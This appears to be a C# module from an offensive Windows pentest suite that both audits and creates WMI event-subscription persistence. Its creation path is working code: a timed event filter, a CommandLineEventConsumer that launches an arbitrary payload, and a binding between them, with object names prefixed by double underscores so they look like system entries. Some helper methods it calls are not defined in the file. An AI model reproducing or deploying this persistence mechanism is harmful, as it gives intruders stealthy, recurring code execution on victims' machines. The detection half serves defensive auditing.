using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Linq;
using System.Management;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using System.IO;
using EliteWindowsPentestSuite.Core;
using EliteWindowsPentestSuite.Models.Results;
using EPenT.Core;
using iText.Kernel.Pdf.Canvas.Parser.Filter;

namespace EliteWindowsPentestSuite.Modules.Persistence
{
    public class WMIPersistence : IDisposable
    {
        private readonly IConfiguration _configuration;
        private readonly ILogger<WMIPersistence> _logger;
        private readonly SecurityContext _securityContext;
        private readonly ManagementScope _managementScope;

        public WMIPersistence(
            IConfiguration configuration,
            ILogger<WMIPersistence> logger,
            SecurityContext securityContext)
        {
            _configuration = configuration ?? throw new ArgumentNullException(nameof(configuration));
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _securityContext = securityContext ?? throw new ArgumentNullException(nameof(securityContext));

            try
            {
                _managementScope = new ManagementScope(@"\\.\root\subscription");
                _managementScope.Connect();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to connect to WMI subscription namespace");
            }
        }

        public async Task<WMIPersistenceResult> ExecuteAsync()
        {
            _logger.LogInformation("Starting WMI persistence analysis");
            var result = new WMIPersistenceResult();

            try
            {
                await Task.Run(() => AnalyzeEventFilters(result));
                await Task.Run(() => AnalyzeEventConsumers(result));
                await Task.Run(() => AnalyzeFilterConsumerBindings(result));
                await Task.Run(() => AnalyzeWMIClasses(result));

                result.TotalWMIObjectsAnalyzed = result.EventFilters.Count +
                                               result.EventConsumers.Count +
                                               result.FilterConsumerBindings.Count;
                result.Success = true;
                result.ExecutionTime = DateTime.UtcNow;

                _logger.LogInformation($"WMI persistence analysis completed. Objects analyzed: {result.TotalWMIObjectsAnalyzed}");
                return result;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "WMI persistence analysis failed");
                result.AddError($"WMI analysis failed: {ex.Message}");
                result.Success = false;
                return result;
            }
        }

        public async Task<bool> EstablishPersistenceAsync(PersistenceOptions options)
        {
            try
            {
                _logger.LogInformation($"Creating WMI persistence: {options.Name}");

                if (_managementScope == null || !_managementScope.IsConnected)
                    return false;

                var filterName = $"__{options.Name}Filter";
                var consumerName = $"__{options.Name}Consumer";

                var eventFilterCreated = await CreateEventFilter(filterName, options);
                if (!eventFilterCreated)
                    return false;

                var eventConsumerCreated = await CreateEventConsumer(consumerName, options);
                if (!eventConsumerCreated)
                {
                    await RemoveEventFilter(filterName);
                    return false;
                }

                var bindingCreated = await CreateFilterConsumerBinding(filterName, consumerName);
                if (!bindingCreated)
                {
                    await RemoveEventFilter(filterName);
                    await RemoveEventConsumer(consumerName);
                    return false;
                }

                _logger.LogInformation($"WMI persistence created successfully: {options.Name}");
                return true;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to establish WMI persistence");
                return false;
            }
        }

        public async Task<bool> RemovePersistenceAsync(string identifier)
        {
            try
            {
                _logger.LogInformation($"Removing WMI persistence: {identifier}");

                var filterName = $"__{identifier}Filter";
                var consumerName = $"__{identifier}Consumer";

                var removed = false;

                if (await RemoveFilterConsumerBinding(filterName, consumerName))
                    removed = true;

                if (await RemoveEventFilter(filterName))
                    removed = true;

                if (await RemoveEventConsumer(consumerName))
                    removed = true;

                if (removed)
                    _logger.LogInformation($"WMI persistence removed successfully: {identifier}");

                return removed;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to remove WMI persistence");
                return false;
            }
        }

        public async Task<List<PersistenceMechanism>> GetActiveMechanismsAsync()
        {
            var mechanisms = new List<PersistenceMechanism>();

            try
            {
                if (_managementScope == null || !_managementScope.IsConnected)
                    return mechanisms;

                var query = "SELECT * FROM __FilterToConsumerBinding";
                using (var searcher = new ManagementObjectSearcher(_managementScope, new ObjectQuery(query)))
                using (var collection = searcher.Get())
                {
                    foreach (ManagementObject obj in collection)
                    {
                        try
                        {
                            var filter = obj["Filter"]?.ToString();
                            var consumer = obj["Consumer"]?.ToString();

                            if (!string.IsNullOrEmpty(filter) && !string.IsNullOrEmpty(consumer))
                            {
                                mechanisms.Add(new PersistenceMechanism
                                {
                                    Identifier = ExtractNameFromPath(consumer),
                                    Method = PersistenceMethod.WMI,
                                    Location = "WMI Subscription",
                                    Command = consumer,
                                    Arguments = filter,
                                    IsActive = true,
                                    CreatedDate = DateTime.UtcNow,
                                    LastModified = DateTime.UtcNow,
                                    Properties = new Dictionary<string, object>
                                    {
                                        ["Filter"] = filter,
                                        ["Consumer"] = consumer
                                    }
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogWarning($"Failed to process WMI binding - {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to get active WMI mechanisms");
            }

            return mechanisms;
        }

        public async Task<bool> TestPersistenceAsync(string identifier)
        {
            try
            {
                var mechanisms = await GetActiveMechanismsAsync();
                return mechanisms.Any(m => m.Identifier.Contains(identifier) && m.IsActive);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Failed to test WMI persistence: {identifier}");
                return false;
            }
        }

        public async Task<bool> IsMethodAvailableAsync()
        {
            try
            {
                return _managementScope != null && _managementScope.IsConnected;
            }
            catch
            {
                return false;
            }
        }

        private void AnalyzeEventFilters(WMIPersistenceResult result)
        {
            try
            {
                var query = "SELECT * FROM __EventFilter";
                using (var searcher = new ManagementObjectSearcher(_managementScope, new ObjectQuery(query)))
                using (var collection = searcher.Get())
                {
                    foreach (ManagementObject obj in collection)
                    {
                        try
                        {
                            var eventFilter = new WMIEventFilter
                            {
                                Name = obj["Name"]?.ToString(),
                                Query = obj["Query"]?.ToString(),
                                QueryLanguage = obj["QueryLanguage"]?.ToString(),
                                EventNamespace = obj["EventNamespace"]?.ToString(),
                                CreatorSID = obj["CreatorSID"] as byte[],
                                IsSuspicious = IsSuspiciousEventFilter(obj)
                            };

                            result.EventFilters.Add(eventFilter);
                        }
                        catch (Exception ex)
                        {
                            _logger.LogWarning($"Failed to analyze event filter - {ex.Message}");
                            result.AddError("Event filter analysis failed");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to analyze WMI event filters");
                result.AddError("WMI event filter enumeration failed");
            }
        }

        private void AnalyzeEventConsumers(WMIPersistenceResult result)
        {
            try
            {
                var consumerTypes = new[]
                {
                    "CommandLineEventConsumer",
                    "ActiveScriptEventConsumer",
                    "LogFileEventConsumer",
                    "NTEventLogEventConsumer",
                    "SMTPEventConsumer"
                };

                foreach (var consumerType in consumerTypes)
                {
                    var query = $"SELECT * FROM {consumerType}";
                    using (var searcher = new ManagementObjectSearcher(_managementScope, new ObjectQuery(query)))
                    {
                        try
                        {
                            using (var collection = searcher.Get())
                            {
                                foreach (ManagementObject obj in collection)
                                {
                                    try
                                    {
                                        var eventConsumer = new WMIEventConsumer
                                        {
                                            Name = obj["Name"]?.ToString(),
                                            Type = consumerType,
                                            ExecutablePath = obj["ExecutablePath"]?.ToString(),
                                            CommandLineTemplate = obj["CommandLineTemplate"]?.ToString(),
                                            ScriptingEngine = obj["ScriptingEngine"]?.ToString(),
                                            ScriptText = obj["ScriptText"]?.ToString(),
                                            CreatorSID = obj["CreatorSID"] as byte[],
                                            IsSuspicious = IsSuspiciousEventConsumer(obj, consumerType)
                                        };

                                        result.EventConsumers.Add(eventConsumer);
                                    }
                                    catch (Exception ex)
                                    {
                                        _logger.LogWarning($"Failed to analyze event consumer - {ex.Message}");
                                    }
                                }
                            }
                        }
                        catch (ManagementException)
                        {
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to analyze WMI event consumers");
                result.AddError("WMI event consumer enumeration failed");
            }
        }

        private void AnalyzeFilterConsumerBindings(WMIPersistenceResult result)
        {
            try
            {
                var query = "SELECT * FROM __FilterToConsumerBinding";
                using (var searcher = new ManagementObjectSearcher(_managementScope, new ObjectQuery(query)))
                using (var collection = searcher.Get())
                {
                    foreach (ManagementObject obj in collection)
                    {
                        try
                        {
                            var binding = new WMIFilterConsumerBinding
                            {
                                Filter = obj["Filter"]?.ToString(),
                                Consumer = obj["Consumer"]?.ToString(),
                                CreatorSID = obj["CreatorSID"] as byte[],
                                IsSuspicious = IsSuspiciousBinding(obj)
                            };

                            result.FilterConsumerBindings.Add(binding);
                        }
                        catch (Exception ex)
                        {
                            _logger.LogWarning($"Failed to analyze filter-consumer binding - {ex.Message}");
                            result.AddError("Filter-consumer binding analysis failed");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to analyze WMI filter-consumer bindings");
                result.AddError("WMI binding enumeration failed");
            }
        }

        private void AnalyzeWMIClasses(WMIPersistenceResult result)
        {
            try
            {
                var namespacesToCheck = new[]
                {
                    @"root\cimv2",
                    @"root\default",
                    @"root\subscription"
                };

                foreach (var namespaceName in namespacesToCheck)
                {
                    try
                    {
                        using (var scope = new ManagementScope(namespaceName))
                        {
                            scope.Connect();

                            var query = "SELECT * FROM meta_class WHERE __CLASS LIKE '%Event%'";
                            using (var searcher = new ManagementObjectSearcher(scope, new ObjectQuery(query)))
                            using (var collection = searcher.Get())
                            {
                                foreach (ManagementClass cls in collection)
                                {
                                    try
                                    {
                                        var className = cls["__CLASS"]?.ToString();
                                        if (!string.IsNullOrEmpty(className) &&
                                            IsSuspiciousWMIClass(className))
                                        {
                                            result.SuspiciousWMIClasses.Add(new WMIClassInfo
                                            {
                                                ClassName = className,
                                                Namespace = namespaceName,
                                                IsSuspicious = true
                                            });
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        _logger.LogWarning($"Failed to analyze WMI class - {ex.Message}");
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogWarning($"Failed to analyze WMI namespace: {namespaceName} - {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Failed to analyze WMI classes");
                result.AddError("WMI class analysis failed");
            }
        }

        private async Task<bool> CreateEventFilter(string filterName, PersistenceOptions options)
        {
            try
            {
                using (var filterClass = new ManagementClass(_managementScope, new ManagementPath("__EventFilter"), null))
                using (var filter = filterClass.CreateInstance())
                {
                    filter["Name"] = filterName;
                    filter["Query"] = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'";
                    filter["QueryLanguage"] = "WQL";
                    filter["EventNamespace"] = @"root\cimv2";

                    filter.Put();
                    return true;
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Failed to create event filter: {filterName}");
                return false;
            }
        }

        private async Task<bool> CreateEventConsumer(string consumerName, PersistenceOptions options)
        {
            try
            {
                using (var consumerClass = new ManagementClass(_managementScope, new ManagementPath("CommandLineEventConsumer"), null))
                using (var consumer = consumerClass.CreateInstance())
                {
                    consumer["Name"] = consumerName;
                    consumer["ExecutablePath"] = options.PayloadPath;
                    consumer["CommandLineTemplate"] = !string.IsNullOrEmpty(options.Arguments)
                        ? $"\"{options.PayloadPath}\" {options.Arguments}"
                        : $"\"{options.PayloadPath}\"";

                    consumer.Put();
                    return true;
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Failed to create event consumer: {consumerName}");
                return false;
            }
        }

        private async Task<bool> CreateFilterConsumerBinding(string filterName, string consumerName)
        {
            try
            {
                using (var bindingClass = new ManagementClass(_managementScope, new ManagementPath("__FilterToConsumerBinding"), null))
                using (var binding = bindingClass.CreateInstance())
                {
                    binding["Filter"] = $"__EventFilter.Name=\"{filterName}\"";
                    binding["Consumer"] = $"CommandLineEventConsumer.Name=\"{consumerName}\"";

                    binding.Put();
                    return true;
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Failed to create filter-consumer binding: {filterName} -> {consumerName}");
                return false;
            }
        }

        private async Task<bool> RemoveEventFilter(string filterName)
        {
            try
            {
                var query = $"SELECT * FROM __EventFilter WHERE Name = '{filterName}'";
                using (var searcher = new ManagementObjectSearcher(_managementScope, new ObjectQuery(query)))
                using (var collection = searcher.Get())
                {
                    foreach (ManagementObject obj in collection)
                    {
                        obj.Delete();
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Failed to remove event filter: {filterName}");
                return false;
            }
        }

        private async Task<bool> RemoveEventConsumer(string consumerName)
        {
            try
            {
                var query = $"SELECT * FROM CommandLineEventConsumer WHERE Name = '{consumerName}'";
                using (var searcher = new ManagementObjectSearcher(_managementScope, new ObjectQuery(query)))
                using (var collection = searcher.Get())
                {
                    foreach (ManagementObject obj in collection)
                    {
                        obj.Delete();
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Failed to remove event consumer: {consumerName}");
                return false;
            }
        }

        private async Task<bool> RemoveFilterConsumerBinding(string filterName, string consumerName)
        {
            try
            {
                var query = $"SELECT * FROM __FilterToConsumerBinding WHERE Filter = '__EventFilter.Name=\"{filterName}\"' AND Consumer = 'CommandLineEventConsumer.Name=\"{consumerName}\"'";
                using (var searcher = new ManagementObjectSearcher(_managementScope, new ObjectQuery(query)))
                using (var collection = searcher.Get())
                {
                    foreach (ManagementObject obj in collection)
                    {
                        obj.Delete();
                        return true;
                    }
                }
                return false;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Failed to remove filter-consumer binding: {filterName} -> {consumerName}");
                return false;
            }
        }
    }
}